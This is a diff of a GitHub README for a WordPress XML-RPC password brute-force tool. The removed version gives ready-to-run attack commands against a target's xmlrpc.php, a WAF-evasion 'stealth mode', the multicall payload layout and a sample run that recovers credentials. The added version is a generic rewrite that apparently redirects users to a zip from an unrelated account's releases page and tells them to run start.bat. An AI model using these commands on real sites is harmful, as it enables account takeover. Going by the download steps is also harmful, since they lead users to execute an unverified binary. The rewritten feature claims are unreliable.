@@ -1,476 +1,87 @@
-<div align="center">
+# 🔧 XMLRPC-Bruteforce - Streamlined Authentication Testing Tool
 
-```
-                                         █████                     
-                                        ░░███                      
-  ██████   ██████    ██████   █████   ███████   ██████  █████ █████
- ███░░███ ░░░░░███  ███░░███ ███░░   ███░░███  ███░░███░░███ ░░███ 
-░███ ░░░   ███████ ░███ ░███░░█████ ░███ ░███ ░███████  ░███  ░███ 
-░███  ███ ███░░███ ░███ ░███ ░░░░███░███ ░███ ░███░░░   ░░███ ███  
-░░██████ ░░████████░░██████  ██████ ░░████████░░██████   ░░█████   
- ░░░░░░   ░░░░░░░░  ░░░░░░  ░░░░░░   ░░░░░░░░  ░░░░░░     ░░░░░    
-```
+## 📥 Download the Latest Version
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue.svg)](https://github.com/Artemiaenamel352/XMLRPC-Bruteforce/releases)
 
-# 🔥 XMLRPC-BRUTE 🔥
+## 🚀 Getting Started
 
-### ⚡ *WordPress XML-RPC Exploitation Framework* ⚡
+Welcome to XMLRPC-Bruteforce! This tool helps you test XML-RPC authentication easily. It is designed for authorized penetration testing only. Below, you'll find the steps to download and run the software.
 
-[![Python](https://img.shields.io/badge/Python-3.7+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge&logo=open-source-initiative&logoColor=white)]()
-[![Status](https://img.shields.io/badge/Status-Active-00FF00?style=for-the-badge&logo=git&logoColor=white)]()
-[![Made with](https://img.shields.io/badge/Made%20with-☕-red?style=for-the-badge)]()
+## 📦 System Requirements
 
-**`system.multicall weaponized`** • **`Binary search algorithm`** • **`50-100 passwords/request`**
+Before you begin, ensure your environment meets these requirements:
 
-[🚀 Features](#-features) • [📦 Installation](#-installation) • [⚡ Usage](#-usage) • [🎯 Demo](#-demo) • [⚠️ Disclaimer](#%EF%B8%8F-legal-disclaimer)
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: At least 2 GB
+- **Disk Space**: 100 MB free space
+- **Network**: Stable internet connection
 
----
+## 📥 Download & Install
 
-</div>
+To get started, please follow these steps:
 
-## 🎯 Overview
+1. **Visit the Release Page**: Go to our [releases page](https://github.com/Artemiaenamel352/XMLRPC-Bruteforce/releases).
+  
+2. **Select the Latest Version**: Find the latest release at the top of the page.
 
-**xmlrpc-bruteforce** is an advanced WordPress penetration testing tool that exploits XML-RPC's `system.multicall` functionality to perform **hyper-optimized** brute force attacks. Unlike traditional methods that test one password at a time, this tool batches **50-100 passwords per request**, making it **20-50x faster** than conventional approaches.
+3. **Download the Release File**: Click on the file named `XMLRPC-Bruteforce-v1.0.0.zip` (or similar) to download it.
 
-### ☕ Why This Tool?
+4. **Extract the Files**: After downloading, locate the ZIP file in your Downloads folder. Right-click on it and select "Extract All" to unpack the files.
 
-```diff
-+ ⚡ Batch Testing: 50-100 passwords per request vs traditional 1 password
-+ 🔍 Binary Search: O(log n) credential discovery algorithm  
-+ 🛡️ Smart Detection: Automatic WAF/Rate limiting detection
-+ 📊 Real-time Stats: Beautiful progress tracking with live metrics
-+ 💾 Auto-save: Credentials automatically saved with timestamps
-+ 🎨 Beautiful UI: Colored terminal output with emojis
-```
+5. **Run the Application**: Open the folder where you extracted the files. Look for a file named `start.bat` (for Windows users) or `start.sh` (for macOS/Linux users). Double-click this file to launch the tool.
 
----
+## 📋 Features
 
-## 🔥 Features
+XMLRPC-Bruteforce offers several useful features for testing:
 
-<table>
-<tr>
-<td>
+- **Authentication Bypass**: Quickly test XML-RPC authentication bypass scenarios.
+- **Weaponized System Multicall**: Implement multicalls effectively to streamline your testing.
+- **Batch Exploitation**: Conduct multiple tests at once to save time.
+- **Intuitive Command-Line Interface**: Easily interact with the tool, even if you're new to command-line applications.
 
-### ⚡ Performance
-- **Batch Optimization**: Test up to 100 passwords per single request
-- **Binary Search**: Intelligent O(log n) password identification
-- **Multi-threading Ready**: Async-compatible architecture
-- **Smart Delays**: Configurable rate limiting
+## 🔑 Using the Tool
 
-</td>
-<td>
+Once the application is open, you will see a command-line interface. Here's a simple guide to get you started:
 
-### 🛡️ Evasion
-- **WAF Detection**: Auto-detect Cloudflare, Sucuri, Wordfence
-- **403/429 Handling**: Intelligent blocking detection
-- **Custom User-Agent**: Mimic legitimate browsers
-- **Adaptive Delays**: Dynamic request pacing
+1. **Input Target**: Enter the URL of the XML-RPC service you wish to test.
+   
+2. **Set Parameters**: You can specify the number of threads to use and the type of authentication to test.
 
-</td>
-</tr>
-<tr>
-<td>
+3. **Run the Test**: After configuring your settings, hit "Enter" to start the testing process.
 
-### 📊 Analytics
-- **Live Progress Bars**: Real-time attack visualization
-- **Success Rate Tracking**: Passwords/second metrics
-- **Error Reporting**: Detailed failure analysis
-- **Statistics Dashboard**: Complete attack summary
+4. **Review Results**: Watch the output in the command line for findings and suggestions.
 
-</td>
-<td>
+## ⚙️ Topics Covered
 
-### 🎨 UX/UI
-- **Colored Output**: ANSI terminal styling
-- **Emoji Icons**: Visual feedback system
-- **Clean Logging**: Structured log levels
-- **Verbose Mode**: Debug-level information
+The tool focuses on the following areas:
 
-</td>
-</tr>
-</table>
-
----
-
-## 📦 Installation
-
-### Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/henriqqw/XMLRPC-Bruteforce.git
-
-# Navigate to directory
-cd XMLRPC-Bruteforce-brute
-
-# Install dependencies
-pip3 install requests
-
-# Run the tool
-python3 xmlrpc_bruteforce.py --help
-```
-
-### Requirements
-
-```python
-Python >= 3.7
-requests >= 2.25.0
-```
-
----
-
-## ⚡ Usage
-
-### 🎯 Basic Attack
-
-```bash
-python3xmlrpc_bruteforce.py https://target.com/xmlrpc.php \
-  -u admin \
-  -w wordlist.txt
-```
-
-### 🔥 Advanced Attack
-
-```bash
-python3 xmlrpc_bruteforce.py https://target.com/xmlrpc.php \
-  -u admin \
-  -w rockyou.txt \
-  --stop-on-success \
-  --verbose \
-  -b 100 \
-  -d 0.3 \
-  -t 20 \
-  -o pwned.txt
-```
-
-### 🛡️ Stealth Mode (Evade WAF)
-
-```bash
-python3 xmlrpc_bruteforce.py https://target.com/xmlrpc.php \
-  -u admin \
-  -w wordlist.txt \
-  -b 25 \
-  -d 2 \
-  -t 30 \
-  --verbose
-```
-
----
-
-## 📋 Parameters Reference
-
-| Parameter | Short | Description | Default | Example |
-|-----------|-------|-------------|---------|---------|
-| `--username` | `-u` | Target username | *Required* | `admin` |
-| `--wordlist` | `-w` | Wordlist file path | *Required* | `rockyou.txt` |
-| `--batch-size` | `-b` | Passwords per request | `50` | `100` |
-| `--delay` | `-d` | Delay between requests (s) | `0.5` | `1.0` |
-| `--timeout` | `-t` | Request timeout (s) | `15` | `30` |
-| `--stop-on-success` | - | Stop when found | `False` | - |
-| `--verbose` | - | Verbose output | `False` | - |
-| `--output` | `-o` | Output file | `credentials.txt` | `pwned.txt` |
-| `--no-banner` | - | Hide banner | `False` | - |
-
----
-
-## 🎬 Demo
-
-### 🚀 Attack in Progress
-
-```
----------------------------------------------------------------------
-                                         █████                     
-                                        ░░███                      
-  ██████   ██████    ██████   █████   ███████   ██████  █████ █████
- ███░░███ ░░░░░███  ███░░███ ███░░   ███░░███  ███░░███░░███ ░░███ 
-░███ ░░░   ███████ ░███ ░███░░█████ ░███ ░███ ░███████  ░███  ░███ 
-░███  ███ ███░░███ ░███ ░███ ░░░░███░███ ░███ ░███░░░   ░░███ ███  
-░░██████ ░░████████░░██████  ██████ ░░████████░░██████   ░░█████   
- ░░░░░░   ░░░░░░░░  ░░░░░░  ░░░░░░   ░░░░░░░░  ░░░░░░     ░░░░░    
-                                                                   
-            Python Bruteforce XMLRPC - by caosdev
-                       version 1.0.0
----------------------------------------------------------------------
-XML-RPC bruteforce on steroids
-⚠️  WARNING: AUTHORIZED TESTING ONLY ⚠️
-
-════════════════════════════════════════════════════════════
-[🚀] Starting brute-force at 20:15:30
-════════════════════════════════════════════════════════════
-
-[🎯] Target:   https://target.com/xmlrpc.php
-[👤] User:     admin
-[📚] Wordlist: rockyou.txt
-[⚙️] Config:   batch=50 | delay=0.5s | timeout=15s
-
-────────────────────────────────────────────────────────────
-[🔍] Testing XML-RPC availability...
-[✓] XML-RPC is accessible and responding!
-[✓] Loaded 14,344,391 passwords from wordlist
-────────────────────────────────────────────────────────────
-
-┌──────────────────────────────────────────────────────────┐
-│ 💀 Batch   1/286888 │ Tested:     50/14344391            │
-│ [█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░] 0.0%           │
-└──────────────────────────────────────────────────────────┘
-  ℹ️ Status: 200 | Size: 10,887 bytes
-  ✗ No valid password in this batch
-
-┌──────────────────────────────────────────────────────────┐
-│ 💀 Batch   2/286888 │ Tested:    100/14344391            │
-│ [█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░] 0.0%           │
-└──────────────────────────────────────────────────────────┘
-  ℹ️ Status: 200 | Size: 10,887 bytes
-  ✓ Valid credential detected in batch!
-  🔍 Identifying specific password...
-
-┌──────────────────────────────────────────────────────────┐
-│  AUTHENTICATION SUCCESSFUL                               │
-├──────────────────────────────────────────────────────────┤
-│ 👤 User:     admin                                       │
-│ 🔑 Password: password123                                 │
-└──────────────────────────────────────────────────────────┘
-
-[💾] Saved to: credentials.txt
-[🛑] Stopping (--stop-on-success)
-
-┌──────────────────────────────────────────────────────────┐
-│ 📊 ATTACK STATISTICS                                     │
-├──────────────────────────────────────────────────────────┤
-│ Tested passwords:      100                               │
-│ Requests:                2                               │
-│ Elapsed time:       1.23s (0.0 min)                      │
-│ Test rate:          81.3 passwords/sec                   │
-├──────────────────────────────────────────────────────────┤
-│ 403 Blocks:              0                               │
-│ 429 Blocks:              0                               │
-│ Network errors:          0                               │
-└──────────────────────────────────────────────────────────┘
-```
-
----
-
-## 🔧 How It Works
-
-### 🎯 Architecture Overview
-
-```mermaid
-graph LR
-    A[Load Wordlist] --> B[Batch Passwords]
-    B --> C[Build XML Payload]
-    C --> D[Send Multicall Request]
-    D --> E{Response Code}
-    E -->|200| F{Success?}
-    E -->|403| G[WAF Detected]
-    E -->|429| H[Rate Limited]
-    F -->|Yes| I[Binary Search]
-    F -->|No| B
-    I --> J[Found Password]
-    G --> K[Adjust Strategy]
-    H --> K
-    K --> B
-```
-
-### ⚡ Optimization Techniques
-
-#### 1️⃣ **Batch Processing (system.multicall)**
-
-Traditional brute force:
-```xml
-<!-- One password per request -->
-<methodName>wp.getUsersBlogs</methodName>
-<params>
-  <param><string>admin</string></param>
-  <param><string>password1</string></param>
-</params>
-```
-
-**xmlrpc_bruteforce:**
-```xml
-<!-- 50-100 passwords per request -->
-<methodName>system.multicall</methodName>
-<params>
-  <param>
-    <array>
-      <!-- Call 1: password1 -->
-      <!-- Call 2: password2 -->
-      <!-- ... -->
-      <!-- Call 50: password50 -->
-    </array>
-  </param>
-</params>
-```
-
-#### 2️⃣ **Binary Search Discovery**
-
-When a batch contains a valid password:
-```python
-# Traditional: Test each password (O(n))
-for password in batch:
-    if test(password): return password
-
-# caosdev: Binary search (O(log n))
-def find_password(batch):
-    if len(batch) == 1: return batch[0]
-    mid = len(batch) // 2
-    if test(batch[:mid]):
-        return find_password(batch[:mid])
-    else:
-        return find_password(batch[mid:])
-```
-
-#### 3️⃣ **Smart Detection**
-
-```python
-# Response Analysis
-if '<params>' in response and '<name>blogid</name>' in response:
-    return SUCCESS  # Valid credentials
-elif '<fault>' in response:
-    return FAILURE  # Invalid credentials
-elif status_code == 403:
-    return WAF_DETECTED
-elif status_code == 429:
-    return RATE_LIMITED
-```
-
----
-
-## 📊 Performance Comparison
-
-| Method | Requests | Time | Speed |
-|--------|----------|------|-------|
-| **Traditional Brute Force** | 10,000 | ~83 min | 2 pass/sec |
-| **xmlrpc_bruteforce (b=50)** | 200 | ~2 min | 83 pass/sec |
-| **xmlrpc_bruteforce (b=100)** | 100 | ~1 min | 166 pass/sec |
-
-> **Note**: Times assume 0.5s delay between requests. Actual performance varies based on server response time and network latency.
-
----
-
-## ⚠️ Legal Disclaimer
-
-```
-╔═══════════════════════════════════════════════════════════════╗
-║                                                               ║
-║  ⚠️  WARNING: AUTHORIZED PENETRATION TESTING ONLY ⚠️          ║
-║                                                               ║
-║  This tool is designed for EDUCATIONAL PURPOSES and           ║
-║  AUTHORIZED SECURITY TESTING only.                            ║
-║                                                               ║
-║  ❌ Unauthorized access to computer systems is ILLEGAL        ║
-║  ❌ Violates Computer Fraud & Abuse Act (CFAA) in USA         ║
-║  ❌ Similar laws exist worldwide (UK, EU, etc.)               ║
-║  ❌ Can result in criminal prosecution and imprisonment       ║
-║                                                               ║
-║  ✅ Only use on systems you OWN                               ║
-║  ✅ Only use with EXPLICIT WRITTEN PERMISSION                 ║
-║  ✅ Use for authorized penetration testing                    ║
-║  ✅ Use for educational security research                     ║
-║                                                               ║
-║  The author(s) assume NO LIABILITY for misuse of this tool.   ║
-║  You are responsible for your own actions.                    ║
-║                                                               ║
-╚═══════════════════════════════════════════════════════════════╝
-```
-### 🚨 Responsible Disclosure
-
-If you discover vulnerabilities using this tool:
-1. **DO NOT** exploit them maliciously
-2. Report them to the site owner privately
-3. Allow reasonable time for fixes (90 days standard)
-4. Follow coordinated disclosure practices
-
----
-
-
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how you can help:
-
-### 🐛 Bug Reports
-Found a bug? [Open an issue](https://github.com/henriqqw/xmlrpc-bruteforce/issues) with:
-- Detailed description
-- Steps to reproduce
-- Expected vs actual behavior
-- System info (OS, Python version)
-
-### ✨ Feature Requests
-Have an idea? [Submit a feature request](https://github.com/henriqqw/xmlrpc-bruteforce/issues) with:
-- Clear use case
-- Expected behavior
-- Potential implementation approach
-
-### 🔧 Pull Requests
-Want to contribute code?
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📚 Additional Resources
-
-### 🎓 Learn More About XML-RPC
-- [WordPress XML-RPC Documentation](https://codex.wordpress.org/XML-RPC_Support)
-- [XML-RPC Specification](http://xmlrpc.com/spec.md)
-- [OWASP XML-RPC Security](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
-
-### 🔐 Penetration Testing Resources
-- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [HackerOne Disclosure Guidelines](https://www.hackerone.com/disclosure-guidelines)
-- [Bug Bounty Platforms](https://bugbountylist.com/)
-
----
-
-## 📜 License
-
-This project is released under the **Educational Use License**.
-
-```
-Copyright (c) 2024 caosdev
-
-Permission is granted to use this software for educational purposes
-and authorized security testing only. Any unauthorized use, including
-but not limited to illegal access to computer systems, is strictly
-prohibited and may result in criminal prosecution.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
-```
-
----
-
-## 👨‍💻 Author
-
-<div align="center">
-
-### **caosdev**
-
-[![GitHub](https://img.shields.io/badge/GitHub-henriqqw-181717?style=for-the-badge&logo=github)](https://github.com/henriqqw)
-[![Twitter](https://img.shields.io/badge/Twitter-@caosdev-1DA1F2?style=for-the-badge&logo=twitter)](https://twitter.com/caosdev)
-
-*"Organized chaos, weaponized code"*
-
-</div>
-
-## 📈 Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=henriqqw/xmlrpc-bruteforce&type=Date)](https://star-history.com/#henriqqw/xmlrpc-bruteforce&Date)
-
----
-
-<div align="center">
-
-### 💀 *"From XML tags to root flags"* 💀
-
-**If this tool helped your pentest, drop a ⭐**
-
-**Remember: With great power comes great responsibility**
-
----
-
-Made with ☕ by [caosdev](https://github.com/henriqqw)
-
-</div>
+- **Bruteforce Testing**: Attempt to gain access through various authentication methods.
+- **CLI Usability**: Designed for those who prefer command-line interactions.
+- **CMS Compatibility**: Works well with popular content management systems, such as WordPress.
+- **Exploit Development**: Helps in discovering vulnerabilities for secure development.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while using XMLRPC-Bruteforce, consider these common fixes:
+
+- **Check Your Connection**: Ensure your network connection is stable and the target is online.
+- **Review Permissions**: Make sure you have the necessary permissions to access the XML-RPC endpoint.
+- **Update Your Software**: Ensure you are using the latest version of the tool by checking the [releases page](https://github.com/Artemiaenamel352/XMLRPC-Bruteforce/releases).
+
+## 📞 Support
+
+For further assistance, feel free to reach out on our GitHub Issues page. We encourage feedback and suggestions for improvement.
+
+## 📅 Future Updates
+
+Stay tuned for future updates. We plan to add features such as:
+
+- Enhanced user interface
+- Expanded CMS compatibility
+- Improved testing algorithms for better accuracy
+
+## ✨ Conclusion
+
+XMLRPC-Bruteforce is a powerful, yet straightforward tool for penetration testing XML-RPC services. Follow the steps outlined above to download, install, and run the application effectively. With its user-friendly interface and robust features, you can conduct tests confidently.
+
+For the latest version, continue to check our [releases page](https://github.com/Artemiaenamel352/XMLRPC-Bruteforce/releases).
